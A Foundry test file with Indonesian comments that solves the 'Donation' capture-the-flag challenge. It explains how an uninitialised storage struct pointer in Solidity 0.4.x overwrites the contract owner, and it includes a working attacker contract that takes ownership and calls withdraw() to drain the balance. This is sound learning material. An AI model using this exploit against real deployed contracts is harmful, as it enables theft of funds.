// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// #11 Donation — kontrak 0.4.21 asli. POINTER STORAGE TAK
// TERINISIALISASI di dalam fungsi (varian dari pola FiftyYears #12):
//   Donation donation;   // <-- tanpa `memory`/`storage`
// Di Solidity 0.4.x, variabel lokal bertipe struct default ke STORAGE
// dan bila tidak diinisialisasi menunjuk slot 0. Layout DonationChallenge:
//   slot 0 = donations.length, slot 1 = owner.
// Maka di dalam donate():
//   donation.timestamp = now            ->  slot 0 = now (length!)
//   donation.etherAmount = etherAmount ->  slot 1 = etherAmount (OWNER!)
//   donations.push(donation)            ->  length now+1, elemen di indeks
//                                          `now` (tidak relevan).
// Jadi penyerang memanggil donate(uint160(alamatPenyerang)) dan menjadi
// OWNER. Require msg.value == etherAmount / 10^36 terpenuhi dengan
// nilai kecil (alamat 160-bit / 10^36 <= ~1,46e12 wei). Lalu withdraw()
// menguras seluruh saldo.
// Bukti empiris yang mengarah ke sini: percobaan pertama mengira
// `Donation donation;` adalah memory struct — tapi donations(0)
// mengembalikan (0, 0), membuktikan elemen ditulis di indeks `now`,
// bukan 0: struct itu menunjuk slot 0. Bug divisi integer di donate
// hanyalah mekanisme agar require lolos murah; bug SESUNGGUHNYA
// adalah pointer storage tak terinisialisasi yang menimpa owner.
interface IDonationChallenge {
    function donate(uint256 etherAmount) external payable;
    function withdraw() external;
    function isComplete() external view returns (bool);
    function owner() external view returns (address);
}

contract DonationAttacker {
    address public target;

    function setTarget(address _t) external {
        target = _t;
    }

    function attack() external payable {
        // etherAmount = alamat penyerang sebagai uint256.
        uint256 etherAmount = uint256(uint160(address(this)));
        // msg.value yang dibutuhkan require: etherAmount / 10^36.
        uint256 value = etherAmount / 10 ** 36;
        (bool ok, ) = target.call{value: value}(
            abi.encodeWithSignature("donate(uint256)", etherAmount)
        );
        require(ok);
        // Sekarang owner == address(this). Kuras seluruh saldo.
        (bool ok2, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(ok2);
    }

    receive() external payable {}
}

contract DonationSolve is Test {
    IDonationChallenge challenge;
    DonationAttacker attacker;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        // Deploy dari test contract = setup setia-factory: owner = deployer.
        address c = vm.deployCode("DonationChallenge.sol:DonationChallenge", 1 ether);
        challenge = IDonationChallenge(c);
        attacker = new DonationAttacker();
        vm.deal(address(attacker), 10 ether);
        attacker.setTarget(c);
    }

    function testInit() public view {
        assertFalse(challenge.isComplete());
        assertEq(challenge.owner(), address(this));
    }

    function testSolve() public {
        attacker.attack();
        assertEq(challenge.owner(), address(attacker));
        assertTrue(challenge.isComplete());
    }
}
